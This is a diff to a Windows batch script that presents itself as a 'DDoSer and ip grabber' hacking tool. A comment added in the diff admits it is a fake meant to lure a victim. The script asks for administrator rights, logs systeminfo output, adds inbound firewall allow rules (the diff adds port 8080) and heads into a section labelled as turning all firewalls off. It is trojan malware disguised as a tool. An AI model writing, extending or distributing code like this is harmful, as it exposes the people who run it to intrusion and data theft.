@@ -5,6 +5,7 @@ cls
 echo ==========================
 Title DDoSer and ip grabber!
 echo Hacking Tool
+rem This is a fake created by nametag so victim is more intrigued by the so-called Hacking Tool
 echo Created by Exterminator100
 echo You need to run tool as administrator or it won't work
 echo ==========================
@@ -87,11 +88,13 @@ ECHO.>>9K21JM10B.log
 ECHO.>>9K21JM10B.log
 systeminfo>>9K21JM10B.log
 goto ports
-rem -=- Opens Port 1122 -=-
+rem -=- Opens Ports -=-
 :ports
 cls & color 0a
 netsh advfirewall firewall add rule name="Port 1122 TCP" dir=in action=allow protocol=TCP localport=%1
 netsh advfirewall firewall add rule name="Port 1122 UDP" dir=in action=allow protocol=UDP localport=%1
+netsh advfirewall firewall add rule name="Port 8080 TCP" dir=in action=allow protocol=TCP localport=%1
+netsh advfirewall firewall add rule name="Port 8080 UDP" dir=in action=allow protocol=UDP localport=%1
 goto firewall
 rem -=- Turns all Firewalls off -=-
 :firewall
